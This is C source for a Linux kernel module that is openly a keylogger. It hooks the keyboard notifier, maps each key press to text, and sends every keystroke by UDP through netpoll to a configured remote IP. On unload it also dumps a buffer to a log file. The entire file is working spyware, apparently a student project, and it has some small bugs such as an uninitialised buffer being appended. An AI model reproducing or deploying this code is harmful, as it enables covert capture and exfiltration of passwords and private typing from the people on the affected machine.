#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/netpoll.h>
#include <linux/syscalls.h> 
#include <linux/file.h> 
#include <linux/fcntl.h>  
#include <linux/mm.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#include "settings.h"

#define KEY_PRESSED 1
#define KEY_NOT_PRESSED 0
#define MAX_BUFFER 9999
#define LOG_DIR "/home/keylog"

MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
MODULE_LICENSE("GPL");

//Based on this table
//http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
//Not really sure what these values are based on
static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* keysShift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static struct notifier_block nb;
static struct netpoll np;
char buffer[MAX_BUFFER] = "\nKEYLOG\n--------------------------\n"; //TODO add timestamp
static struct file *outfile = NULL;

/*
/	keyboard_notifier_callback
/	must be of the type notifier_fn_t(notifier_block *nb,
									  unsigned long action, void *data)
/   This is where the key data is send to a remote locations
*/
int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *data){
	struct keyboard_notifier_param *kb = data;

	// Filter so we only send actual keycodes on key presses
	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
		char message[16];
		
		
		strcat(buffer, message);
		//If shift is held, use the shift key mappings
		if(kb->shift == KEY_PRESSED)
			strcpy(message, keysShift[kb->value]);
		else
			strcpy(message, keys[kb->value]);

		printk(KERN_DEBUG "Sending message: %s\n", message);
		netpoll_send_udp(&np, message, strlen(message));
	}

	return 0;
} 

/*
/	init_keylogger
/	This is the module_init function
/	Sets up the notifier block with our callback for keyboard presses
/	Also sets up the netpoll object for use in the callback
*/
static int __init init_keylogger(void){
	nb.notifier_call = keyboard_notifier_callback;

	np.name = "KL";
	strlcpy(np.dev_name, NW_INTERFACE, IFNAMSIZ);
	np.local_ip = (union inet_addr)htonl(LOCAL_IP);
	np.remote_ip = (union inet_addr)htonl(REMOTE_IP);
	np.local_port = LOCAL_PORT;
	np.remote_port = REMOTE_PORT;
	memset(np.remote_mac, 0xff, ETH_ALEN);
	netpoll_print_options(&np);
	netpoll_setup(&np);

	register_keyboard_notifier(&nb);

	return 0;
}

/*
/	exit_keylogger
/	The module_exit function, should be straightforward enough
/
/	Found the filp functions here
/	http://lxr.free-electrons.com/source/fs/open.c#L1072
/	
/	Flags for filp
/	http://pubs.opengroup.org/onlinepubs/7908799/xsh/open.html
/	
/	set_fs()
/	http://lxr.free-electrons.com/source/arch/blackfin/include/asm/uaccess.h#L25
*/
static void __exit exit_keylogger(void){
	mm_segment_t prevfs;
	outfile = filp_open(LOG_DIR, O_RDWR | O_APPEND, 0);
	if(!outfile)
	  printk(KERN_ALERT "Error opening file\n");
	prevfs = USER_DS;
	set_fs(KERNEL_DS);
	strcat(buffer, "\n--------------------------\n");
	outfile->f_op->write(outfile, buffer, strlen(buffer), &outfile->f_pos);
	set_fs(prevfs);
	if(outfile)
	  filp_close(outfile, NULL);
	unregister_keyboard_notifier(&nb);
}

module_init(init_keylogger);
module_exit(exit_keylogger);
